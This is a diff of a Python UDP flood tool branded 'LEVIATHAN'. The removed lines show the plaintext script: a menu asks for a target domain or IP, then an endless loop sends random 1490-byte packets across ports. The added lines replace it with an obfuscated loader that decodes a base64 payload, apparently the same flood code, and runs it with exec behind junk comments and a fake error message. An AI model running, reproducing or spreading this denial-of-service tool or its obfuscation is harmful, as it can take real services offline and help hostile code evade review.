@@ -1,133 +1,40 @@
-import os
-import sys
-import time
-import socket
-import random
-from platform import system
+import base64 as b64, sys, time
 
-# --- ULTRA HIGHLIGHTED COLORS ---
-W = '\033[1;37m'  # White Bold
-G = '\033[1;32m'  # Green Bold
-R = '\033[1;31m'  # Red Bold
-Y = '\033[1;33m'  # Yellow Bold
-B = '\033[1;34m'  # Blue Bold
-C = '\033[1;36m'  # Cyan Bold
-M = '\033[1;35m'  # Magenta Bold
-RE = '\033[0m'    # Reset
-# Background Highlights
-HG = '\033[1;42;30m' # Highlight Green
-HR = '\033[1;41;37m' # Highlight Red
-HB = '\033[1;44;37m' # Highlight Blue
-HC = '\033[1;46;30m' # Highlight Cyan
+# junk_var_gi2o56 = "0.zjctbgquh4b"
+# junk_var_m7yb7 = "0.in6y9qoz9zp"
+# junk_var_y28j39 = "0.o8u7vew6fib"
+# junk_var_pugxgn = "0.w60qnko2zdg"
+# junk_var_kplffr = "0.pd0mw7q27y"
+# junk_var_w7d0v = "0.ezcl864ced"
+# junk_var_50s6og = "0.j6uxa6nt86l"
+# junk_var_bbieve = "0.45oovhaylow"
+# junk_var_oc03pk = "0.9xmbntq15q"
+# junk_var_28hhxt = "0.ssyzxq77scl"
 
-def clear():
-    os.system('cls' if system() == "Windows" else 'clear')
+def _helix_decrypt_layer(data):
+    return b64.b64decode(data).decode('utf-8')
 
-def logo():
-    clear()
-    print(f"""
-{C}   ██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗██╗  ██╗ █████╗ ███╗   ██╗
-   ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██║  ██║██╔══██╗████╗  ██║
-   ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║███████║██╔██╗ ██║
-   ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██║╚██╗██║
-   ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║
-   ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
-{W}   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-           {HG}  SYSTEM VERSION: 1.0  {RE}   {HB}  TEAM: GHOST-CW  {RE}
-{W}   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RE}
-    """)
-
-def slow_print(text):
-    for char in text:
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(0.01)
-
-def startup():
-    clear()
-    print(f"\n\n{B}[>] {W}BOOTING LEVIATHAN CORE...")
-    time.sleep(1)
-    for i in range(1, 101, 5):
-        sys.stdout.write(f"\r{B}[{G}{'█' * (i // 2)}{W}{'.' * (50 - (i // 2))}{B}] {Y}{i}%")
-        sys.stdout.flush()
-        time.sleep(0.05)
-    print(f"\n\n{HG}  SUCCESS: ALL MODULES LOADED  {RE}\n")
-    time.sleep(1.5)
-
-# Initialize Socket
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes_data = random._urandom(1490)
-
-startup()
-
-while True:
-    logo()
-    print(f" {HC}  MAIN INTERFACE  {RE} ")
-    print(f"\n {G}[1]{W} ATTACK DOMAIN")
-    print(f" {G}[2]{W} ATTACK TARGET IP")
-    print(f" {G}[3]{W} VIEW CREDITS")
-    print(f" {R}[0]{W} TERMINATE SYSTEM")
-    
-    print(f"\n{C}╔═══[{G}Leviathan@Console{C}]")
-    choice = input(f"{C}╚══{B}> {Y}")
-
-    if choice == '1':
-        domain = input(f"\n{B}[?]{W} TARGET URL: {Y}")
+class Helix_ypndyn:
+    def __init__(self, payload):
+        self.p = payload
+    def run(self):
         try:
-            ip = socket.gethostbyname(domain)
-            break
-        except:
-            print(f"{HR} ERROR: INVALID DOMAIN {RE}")
-            time.sleep(2)
-    elif choice == '2':
-        ip = input(f"\n{B}[?]{W} TARGET IP: {Y}")
-        break
-    elif choice == '3':
-        print(f"\n{HB}  DEVELOPER INFO  {RE}")
-        print(f"{W}Created by  : {G}LEVIATHAN")
-        print(f"{W}Telegram    : {C}@Mr_Leviathan221")
-        print(f"{W}Status      : {Y}STABLE RELEASE")
-        input(f"\n{M}BACK TO MENU (ENTER)...")
-    elif choice == '0' or choice == '00':
-        print(f"{HR} SHUTTING DOWN... {RE}")
-        sys.exit()
-    else:
-        print(f"{HR} INVALID SELECTION {RE}")
-        time.sleep(1)
+            exec(_helix_decrypt_layer(self.p), globals())
+        except Exception as e:
+            print("System Integrity Error!")
 
-# Attack Setup
-logo()
-print(f" {HC}  ATTACK CONFIGURATION  {RE} ")
-print(f"\n{W}TARGET IP  : {R}{ip}")
-port_choice = input(f"{W}SET CUSTOM PORT? (y/n): {Y}").lower()
+if __name__ == "__main__":
+    # Encrypted Payload Block
+    Ultra_6o1tpb = "aW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHNvY2tldAppbXBvcnQgcmFuZG9tCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQoKIyAtLS0gVUxUUkEgSElHSExJR0hURUQgQ09MT1JTIC0tLQpXID0gJ1wwMzNbMTszN20nICAjIFdoaXRlIEJvbGQKRyA9ICdcMDMzWzE7MzJtJyAgIyBHcmVlbiBCb2xkClIgPSAnXDAzM1sxOzMxbScgICMgUmVkIEJvbGQKWSA9ICdcMDMzWzE7MzNtJyAgIyBZZWxsb3cgQm9sZApCID0gJ1wwMzNbMTszNG0nICAjIEJsdWUgQm9sZApDID0gJ1wwMzNbMTszNm0nICAjIEN5YW4gQm9sZApNID0gJ1wwMzNbMTszNW0nICAjIE1hZ2VudGEgQm9sZApSRSA9ICdcMDMzWzBtJyAgICAjIFJlc2V0CiMgQmFja2dyb3VuZCBIaWdobGlnaHRzCkhHID0gJ1wwMzNbMTs0MjszMG0nICMgSGlnaGxpZ2h0IEdyZWVuCkhSID0gJ1wwMzNbMTs0MTszN20nICMgSGlnaGxpZ2h0IFJlZApIQiA9ICdcMDMzWzE7NDQ7MzdtJyAjIEhpZ2hsaWdodCBCbHVlCkhDID0gJ1wwMzNbMTs0NjszMG0nICMgSGlnaGxpZ2h0IEN5YW4KCmRlZiBjbGVhcigpOgogICAgb3Muc3lzdGVtKCdjbHMnIGlmIHN5c3RlbSgpID09ICJXaW5kb3dzIiBlbHNlICdjbGVhcicpCgpkZWYgbG9nbygpOgogICAgY2xlYXIoKQogICAgcHJpbnQoZiIiIgp7Q30gICDilojilojilZcgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVlyAgIOKWiOKWiOKVl+KWiOKWiOKVlyDilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWXICDilojilojilZcg4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKVlyAgIOKWiOKWiOKVlwogICDilojilojilZEgICAgIOKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KVmuKVkOKVkOKWiOKWiOKVlOKVkOKVkOKVneKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4paI4paI4pWXICDilojilojilZEKICAg4paI4paI4pWRICAgICDilojilojilojilojilojilZcgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVlOKWiOKWiOKVlyDilojilojilZEKICAg4paI4paI4pWRICAgICDilojilojilZTilZDilZDilZ0gIOKVmuKWiOKWiOKVlyDilojilojilZTilZ3ilojilojilZHilojilojilZTilZDilZDilojilojilZEgICDilojilojilZEgICDilojilojilZTilZDilZDilojilojilZHilojilojilZTilZDilZDilojilojilZHilojilojilZHilZrilojilojilZfilojilojilZEKICAg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWXIOKVmuKWiOKWiOKWiOKWiOKVlOKVnSDilojilojilZHilojilojilZEgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilZEg4pWa4paI4paI4paI4paI4pWRCiAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVnSAg4pWa4pWQ4pWQ4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVnSAgIOKVmuKVkOKVnSAgIOKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVkOKVkOKVnQp7V30gICDilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEKICAgICAgICAgICB7SEd9ICBTWVNURU0gVkVSU0lPTjogMS4wICB7UkV9ICAge0hCfSAgVEVBTTogR0hPU1QtQ1cgIHtSRX0Ke1d9ICAg4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBe1JFfQogICAgIiIiKQoKZGVmIHNsb3dfcHJpbnQodGV4dCk6CiAgICBmb3IgY2hhciBpbiB0ZXh0OgogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoY2hhcikKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0aW1lLnNsZWVwKDAuMDEpCgpkZWYgc3RhcnR1cCgpOgogICAgY2xlYXIoKQogICAgcHJpbnQoZiJcblxue0J9Wz5dIHtXfUJPT1RJTkcgTEVWSUFUSEFOIENPUkUuLi4iKQogICAgdGltZS5zbGVlcCgxKQogICAgZm9yIGkgaW4gcmFuZ2UoMSwgMTAxLCA1KToKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYiXHJ7Qn1be0d9eyfilognICogKGkgLy8gMil9e1d9eycuJyAqICg1MCAtIChpIC8vIDIpKX17Qn1dIHtZfXtpfSUiKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMC4wNSkKICAgIHByaW50KGYiXG5cbntIR30gIFNVQ0NFU1M6IEFMTCBNT0RVTEVTIExPQURFRCAge1JFfVxuIikKICAgIHRpbWUuc2xlZXAoMS41KQoKIyBJbml0aWFsaXplIFNvY2tldApzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCmJ5dGVzX2RhdGEgPSByYW5kb20uX3VyYW5kb20oMTQ5MCkKCnN0YXJ0dXAoKQoKd2hpbGUgVHJ1ZToKICAgIGxvZ28oKQogICAgcHJpbnQoZiIge0hDfSAgTUFJTiBJTlRFUkZBQ0UgIHtSRX0gIikKICAgIHByaW50KGYiXG4ge0d9WzFde1d9IEFUVEFDSyBET01BSU4iKQogICAgcHJpbnQoZiIge0d9WzJde1d9IEFUVEFDSyBUQVJHRVQgSVAiKQogICAgcHJpbnQoZiIge0d9WzNde1d9IFZJRVcgQ1JFRElUUyIpCiAgICBwcmludChmIiB7Un1bMF17V30gVEVSTUlOQVRFIFNZU1RFTSIpCiAgICAKICAgIHByaW50KGYiXG57Q33ilZTilZDilZDilZBbe0d9TGV2aWF0aGFuQENvbnNvbGV7Q31dIikKICAgIGNob2ljZSA9IGlucHV0KGYie0N94pWa4pWQ4pWQe0J9PiB7WX0iKQoKICAgIGlmIGNob2ljZSA9PSAnMSc6CiAgICAgICAgZG9tYWluID0gaW5wdXQoZiJcbntCfVs/XXtXfSBUQVJHRVQgVVJMOiB7WX0iKQogICAgICAgIHRyeToKICAgICAgICAgICAgaXAgPSBzb2NrZXQuZ2V0aG9zdGJ5bmFtZShkb21haW4pCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntIUn0gRVJST1I6IElOVkFMSUQgRE9NQUlOIHtSRX0iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDIpCiAgICBlbGlmIGNob2ljZSA9PSAnMic6CiAgICAgICAgaXAgPSBpbnB1dChmIlxue0J9Wz9de1d9IFRBUkdFVCBJUDoge1l9IikKICAgICAgICBicmVhawogICAgZWxpZiBjaG9pY2UgPT0gJzMnOgogICAgICAgIHByaW50KGYiXG57SEJ9ICBERVZFTE9QRVIgSU5GTyAge1JFfSIpCiAgICAgICAgcHJpbnQoZiJ7V31DcmVhdGVkIGJ5ICA6IHtHfUxFVklBVEhBTiIpCiAgICAgICAgcHJpbnQoZiJ7V31UZWxlZ3JhbSAgICA6IHtDfUBNcl9MZXZpYXRoYW4yMjEiKQogICAgICAgIHByaW50KGYie1d9U3RhdHVzICAgICAgOiB7WX1TVEFCTEUgUkVMRUFTRSIpCiAgICAgICAgaW5wdXQoZiJcbntNfUJBQ0sgVE8gTUVOVSAoRU5URVIpLi4uIikKICAgIGVsaWYgY2hvaWNlID09ICcwJyBvciBjaG9pY2UgPT0gJzAwJzoKICAgICAgICBwcmludChmIntIUn0gU0hVVFRJTkcgRE9XTi4uLiB7UkV9IikKICAgICAgICBzeXMuZXhpdCgpCiAgICBlbHNlOgogICAgICAgIHByaW50KGYie0hSfSBJTlZBTElEIFNFTEVDVElPTiB7UkV9IikKICAgICAgICB0aW1lLnNsZWVwKDEpCgojIEF0dGFjayBTZXR1cApsb2dvKCkKcHJpbnQoZiIge0hDfSAgQVRUQUNLIENPTkZJR1VSQVRJT04gIHtSRX0gIikKcHJpbnQoZiJcbntXfVRBUkdFVCBJUCAgOiB7Un17aXB9IikKcG9ydF9jaG9pY2UgPSBpbnB1dChmIntXfVNFVCBDVVNUT00gUE9SVD8gKHkvbik6IHtZfSIpLmxvd2VyKCkKCmlmIHBvcnRfY2hvaWNlID09ICJ5IjoKICAgIHBvcnQgPSBpbnQoaW5wdXQoZiJ7Qn1bP117V30gRU5URVIgUE9SVDoge1l9IikpCiAgICBwb3J0X21vZGUgPSBUcnVlCmVsc2U6CiAgICBwb3J0ID0gMQogICAgcG9ydF9tb2RlID0gRmFsc2UKCiMgV2FybmluZyBDb3VudGRvd24KcHJpbnQoZiJcbntIUn0gIFdBUk5JTkc6IEFUVEFDSyBTVEFSVElORyBJTiAzIFNFQ09ORFMgIHtSRX0iKQp0aW1lLnNsZWVwKDMpCgpzZW50ID0gMAp0cnk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGlmIG5vdCBwb3J0X21vZGU6CiAgICAgICAgICAgIHBvcnQgPSBwb3J0ICsgMSBpZiBwb3J0IDwgNjU1MzQgZWxzZSAxCiAgICAgICAgCiAgICAgICAgc29jay5zZW5kdG8oYnl0ZXNfZGF0YSwgKGlwLCBwb3J0KSkKICAgICAgICBzZW50ICs9IDEKICAgICAgICAKICAgICAgICAjIEhpZ2hsaWdodGVkIEF0dGFjayBMb2cKICAgICAgICBwcmludChmIntHfUxFVklBVEhBTl9TVFJJS0Uge1d9Pj4ge1J9e2lwfXtXfSB8IHtCfVBPUlQ6e1l9e3BvcnR9IHtXfXwge0hHfSBTRU5UOntzZW50fSB7UkV9IikKICAgICAgICAKICAgICAgICAjIE9wdGlvbmFsOiB2ZXJ5IHNtYWxsIHNsZWVwIHRvIHByZXZlbnQgVGVybXV4IGNyYXNoIG9uIHNvbWUgZGV2aWNlcwogICAgICAgICMgdGltZS5zbGVlcCgwLjAwMSkgCgpleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICBwcmludChmIlxuXG57SFJ9ICBBVFRBQ0sgQUJPUlRFRCBCWSBVU0VSICB7UkV9IikKICAgIHByaW50KGYie0hDfSBUT1RBTCBEQVRBIFBBQ0tFVFMgU0VOVDoge3NlbnR9IHtSRX0iKQogICAgdGltZS5zbGVlcCgzKQ=="
+    # junk_var_gi2o56 = "0.zjctbgquh4b"
+# junk_var_m7yb7 = "0.in6y9qoz9zp"
+# junk_var_y28j39 = "0.o8u7vew6fib"
+# junk_var_pugxgn = "0.w60qnko2zdg"
+# junk_var_kplffr = "0.pd0mw7q27y"
+# junk_var_w7d0v = "0.ezcl864ced"
+# junk_var_50s6og = "0.j6uxa6nt86l"
+# junk_var_bbieve = "0.45oovhaylow"
+# junk_var_oc03pk = "0.9xmbntq15q"
+# junk_var_28hhxt = "0.ssyzxq77scl"
 
-if port_choice == "y":
-    port = int(input(f"{B}[?]{W} ENTER PORT: {Y}"))
-    port_mode = True
-else:
-    port = 1
-    port_mode = False
-
-# Warning Countdown
-print(f"\n{HR}  WARNING: ATTACK STARTING IN 3 SECONDS  {RE}")
-time.sleep(3)
-
-sent = 0
-try:
-    while True:
-        if not port_mode:
-            port = port + 1 if port < 65534 else 1
-        
-        sock.sendto(bytes_data, (ip, port))
-        sent += 1
-        
-        # Highlighted Attack Log
-        print(f"{G}LEVIATHAN_STRIKE {W}>> {R}{ip}{W} | {B}PORT:{Y}{port} {W}| {HG} SENT:{sent} {RE}")
-        
-        # Optional: very small sleep to prevent Termux crash on some devices
-        # time.sleep(0.001) 
-
-except KeyboardInterrupt:
-    print(f"\n\n{HR}  ATTACK ABORTED BY USER  {RE}")
-    print(f"{HC} TOTAL DATA PACKETS SENT: {sent} {RE}")
-    time.sleep(3)
+    Helix_ypndyn(Ultra_6o1tpb).run()
